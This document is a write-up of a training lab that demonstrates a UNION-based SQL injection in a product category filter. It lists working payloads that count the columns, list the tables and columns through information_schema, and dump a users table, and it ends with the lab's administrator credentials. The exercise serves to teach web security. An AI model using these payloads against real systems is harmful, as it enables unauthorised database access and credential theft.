
## Description:

this lab contains a SQL injection vulnerability in the product category filter, it is possible to use a UNION attack to retrieve data from other tables

the application has a login function, the database contains a table that holds usernames and passwords, the name and columns of this table must be determined then retrieved 

to solve the lab log in as *administrator*

## Solution:

1. it is necessary to discover how many columns are being returned from the database:

	' UNION SELECT NULL,NULL--
[this step usually involves simple trial and error]

2. it might prove useful to list the names of all tables present in the database:

	' UNION SELECT NULL,table_name FROM information_schema.tables--

in this case there is a table called pg_users, but futher enumerating it shows only the users 'peter' and 'postgres' with their passwords being returned as asterisks so it is safe to assume this is not what we are looking for

there is also a table called users_wuxqrc

3. further enumerating the found table for its columns names

	 ' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users_wuxqrc'--

we find that there are two columns: username_kgorik and password_bsbtde

4. querying the users_wuxqrc table for the newfound columns

	 ' UNION SELECT username_kgorik,password_bsbtde FROM users_wuxqrc--

the credentials for the *administrator* user are then returned

| adminsitrator | vofmq7nderurldq8mcdq | 
| - | - | 

## Notes:


